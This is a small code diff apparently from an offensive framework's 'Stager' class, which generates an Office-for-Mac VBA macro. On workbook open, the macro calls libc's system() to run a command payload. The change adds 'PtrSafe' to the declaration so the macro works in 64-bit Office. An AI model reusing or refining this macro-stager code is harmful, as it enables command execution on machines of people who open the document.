@@ -85,7 +85,7 @@ class Stager:
                 payload = formStr("cmd", match)
 
             macro = """
-Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+Private Declare PtrSafe Function system Lib "libc.dylib" (ByVal command As String) As Long
 
 Private Sub Workbook_Open()
     Dim result As Long
